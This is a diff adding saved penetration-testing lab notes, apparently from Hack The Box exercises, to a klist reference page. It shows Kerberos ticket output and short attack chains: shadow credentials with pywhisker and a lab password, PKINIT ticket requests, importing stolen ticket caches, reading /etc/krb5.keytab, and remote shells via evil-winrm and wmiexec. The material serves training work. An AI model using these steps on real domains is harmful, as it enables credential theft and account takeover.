@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=klist) · [All tools](/index)
+
 ## Windows session
 
 **Windows cmd.exe or PowerShell**
@@ -31,9 +33,418 @@ On Linux, KRB5CCNAME can select a different cache. A ticket in one session is no
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=klist)
+## Notebook recipes
 
-## Learning and original examples
+19 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Pass the Ticket from Windows](/password-attacks/pass-the-ticket-from-windows)
-- [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux)
+<AccordionGroup>
+
+<Accordion title="Confirming a Kerberos Ticket is in Memory Using klist">
+
+### Confirming a Kerberos Ticket is in Memory Using klist
+
+**Child to Parent Trusts - Windows**
+
+```powershell
+PS C:\htb> klist
+
+Current LogonId is 0:0xf6462
+
+Cached Tickets: (1)
+
+#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 3/28/2022 19:59:50 (local)
+        End Time:   3/25/2032 19:59:50 (local)
+        Renew Time: 3/25/2032 19:59:50 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+</Accordion>
+
+<Accordion title="Confirming the Ticket is in Memory Using klist">
+
+### Confirming the Ticket is in Memory Using klist
+
+**Child to Parent Trusts - Windows**
+
+```powershell
+PS C:\htb> klist
+
+Current LogonId is 0:0xf6495
+
+Cached Tickets: (1)
+
+#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+    Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
+    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+    Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+    Start Time: 3/29/2022 10:06:41 (local)
+    End Time:   3/29/2022 20:06:41 (local)
+    Renew Time: 4/5/2022 10:06:41 (local)
+    Session Key Type: RSADSI RC4-HMAC(NT)
+    Cache Flags: 0x1 -> PRIMARY
+    Kdc Called:
+```
+
+</Accordion>
+
+<Accordion title="Workaround #1: PSCredential Object">
+
+### Workaround #1: PSCredential Object
+
+**Kerberos Double Hop**
+
+```shellsession
+*Evil-WinRM* PS C:\Users\backupadm\Documents> klist
+
+Current LogonId is 0:0x57f8a
+
+Cached Tickets: (1)
+
+#0> Client: backupadm @ INLANEFREIGHT.LOCAL
+    Server: academy-aen-ms0$ @
+    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
+    Start Time: 6/28/2022 7:31:53 (local)
+    End Time:   6/28/2022 7:46:53 (local)
+    Renew Time: 7/5/2022 7:31:18 (local)
+    Session Key Type: AES-256-CTS-HMAC-SHA1-96
+    Cache Flags: 0x4 -> S4U
+    Kdc Called: DC01.INLANEFREIGHT.LOCAL
+```
+
+**Kerberos Double Hop**
+
+```cmd
+C:\htb> klist
+
+Current LogonId is 0:0x1e5b8b
+
+Cached Tickets: (4)
+
+#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 6/28/2022 9:13:38 (local)
+        End Time:   6/28/2022 19:13:38 (local)
+        Renew Time: 7/5/2022 9:13:38 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x2 -> DELEGATION
+        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+
+#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 6/28/2022 9:13:38 (local)
+        End Time:   6/28/2022 19:13:38 (local)
+        Renew Time: 7/5/2022 9:13:38 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+
+#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
+        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 6/28/2022 9:13:38 (local)
+        End Time:   6/28/2022 19:13:38 (local)
+        Renew Time: 7/5/2022 9:13:38 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+
+#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
+        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 6/28/2022 9:13:38 (local)
+        End Time:   6/28/2022 19:13:38 (local)
+        Renew Time: 7/5/2022 9:13:38 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+```
+
+</Accordion>
+
+<Accordion title="Workaround #2: Register PSSession Configuration">
+
+### Workaround #2: Register PSSession Configuration
+
+**Kerberos Double Hop**
+
+```powershell
+[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist
+
+Current LogonId is 0:0x11e387
+
+Cached Tickets: (1)
+
+#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
+       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+       Start Time: 6/28/2022 9:09:19 (local)
+       End Time:   6/28/2022 19:09:19 (local)
+       Renew Time: 0
+       Session Key Type: AES-256-CTS-HMAC-SHA1-96
+       Cache Flags: 0x8 -> ASC
+       Kdc Called:
+```
+
+**Kerberos Double Hop**
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+[DEV01]: PS C:\Users\backupadm\Documents> klist
+
+Current LogonId is 0:0x2239ba
+
+Cached Tickets: (1)
+
+#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
+       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+       Start Time: 6/28/2022 13:24:37 (local)
+       End Time:   6/28/2022 23:24:37 (local)
+       Renew Time: 7/5/2022 13:24:37 (local)
+       Session Key Type: AES-256-CTS-HMAC-SHA1-96
+       Cache Flags: 0x1 -> PRIMARY
+       Kdc Called: DC01
+```
+
+</Accordion>
+
+<Accordion title="Kali — obtain and inspect a ticket">
+
+### Kali — obtain and inspect a ticket
+
+**Kerberos when NTLM is unavailable**
+
+```bash
+impacket-getTGT 'DOMAIN_FQDN/USER' -dc-ip DC_IP
+export KRB5CCNAME='/absolute/path/USER.ccache'
+klist
+```
+
+</Accordion>
+
+<Accordion title="Flag 1 — Shadow Credentials → jpinkman">
+
+### Flag 1 — Shadow Credentials → jpinkman
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+# 1. write our key into jpinkman's msDS-KeyCredentialLink → get a PFX + its password
+pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' \
+  --target jpinkman --action add
+#   -> Saved PFX ... eFUVVTPf.pfx   |   Password: bmRH4LK7UwPrAOfvIx6W
+
+# 2. PFX -> TGT as jpinkman
+python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
+  -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+# 3. Pass-the-Ticket -> WinRM in AS jpinkman (Kerberos)
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist                                   # Default principal: jpinkman@INLANEFREIGHT.LOCAL
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
+
+</Accordion>
+
+<Accordion title="Step 2 — cert → TGT as DC01$ (PKINIT)">
+
+### Step 2 — cert → TGT as DC01$ (PKINIT)
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+python3 gettgtpkinit.py -cert-pfx /home/kali/dc01.pfx -dc-ip 10.129.234.174 \
+  'inlanefreight.local/dc01$' /tmp/dc.ccache
+export KRB5CCNAME=/tmp/dc.ccache
+klist                                   # Default principal: dc01$@INLANEFREIGHT.LOCAL
+```
+
+</Accordion>
+
+<Accordion title="Alternative — use the machine ccache SSSD already maintains">
+
+### Alternative — use the machine ccache SSSD already maintains
+
+**Pass the Ticket from Linux**
+
+```bash
+export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+klist     # Default principal: LINUX01$@INLANEFREIGHT.HTB
+smbclient //dc01/linux01 -k -c 'ls' -no-pass
+```
+
+</Accordion>
+
+<Accordion title="Identify the Account">
+
+### Identify the Account
+
+**Pass the Ticket from Linux**
+
+```bash
+klist -k -t carlos.keytab
+```
+
+</Accordion>
+
+<Accordion title="Import a Stolen Ticket">
+
+### Import a Stolen Ticket
+
+**Pass the Ticket from Linux**
+
+```bash
+# Copy to a stable, known filename (don't rely on "." matching where you think you are)
+cp /tmp/krb5cc_647401106_HRJDux /root/julio.ccache
+export KRB5CCNAME=/root/julio.ccache
+klist
+```
+
+</Accordion>
+
+<Accordion title="Step 1 — Confirm the principal in the keytab">
+
+### Step 1 — Confirm the principal in the keytab
+
+**Pass the Ticket from Linux**
+
+```bash
+klist -k /etc/krb5.keytab
+```
+
+</Accordion>
+
+<Accordion title="Step 2 — Request a TGT with the keytab">
+
+### Step 2 — Request a TGT with the keytab
+
+**Pass the Ticket from Linux**
+
+```bash
+kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
+klist     # should now show Default principal: LINUX01$@INLANEFREIGHT.HTB
+```
+
+</Accordion>
+
+<Accordion title="Step 6 — Load the ticket and run tools through proxychains">
+
+### Step 6 — Load the ticket and run tools through proxychains
+
+**Pass the Ticket from Linux**
+
+```bash
+export KRB5CCNAME=/tmp/ticket/krb5cc_647401106_8Dt6uj   # full path to the file you pulled; no FILE: prefix
+klist                                        # confirm it loaded and is still valid
+
+proxychains impacket-wmiexec dc01 -k         # -k = use Kerberos; target by NAME, not IP
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting quick reference">
+
+### Troubleshooting quick reference
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: klist: No credentials cache found KRB5CCNAME  points to a path where the file isn't (e.g. you  cp 'd to  .  while in  /  but exported  /root/... ) Copy to a full absolute path and export that  exact  path;  pwd  to check where  .  is
+
+```text
+klist: No credentials cache found
+```
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: command not found: klist / kinit Kerberos tools not installed sudo apt install -y krb5-user
+
+```text
+command not found: klist
+```
+
+</Accordion>
+
+<Accordion title="Confirming the Ticket is in Memory">
+
+### Confirming the Ticket is in Memory
+
+**Historical AD Vulnerability Labs · older reference**
+
+```powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0x4e56b
+
+Cached Tickets: (3)
+
+#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 3/30/2022 15:53:09 (local)
+        End Time:   3/31/2022 1:50:25 (local)
+        Renew Time: 4/6/2022 15:50:25 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x2 -> DELEGATION
+        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/30/2022 15:50:25 (local)
+        End Time:   3/31/2022 1:50:25 (local)
+        Renew Time: 4/6/2022 15:50:25 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 3/30/2022 15:53:09 (local)
+        End Time:   3/31/2022 1:50:25 (local)
+        Renew Time: 4/6/2022 15:50:25 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+```
+
+</Accordion>
+
+<Accordion title="Running klist">
+
+### Running klist
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ klist
+
+Ticket cache: FILE:dc01.ccache
+Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+```
+
+</Accordion>
+
+</AccordionGroup>
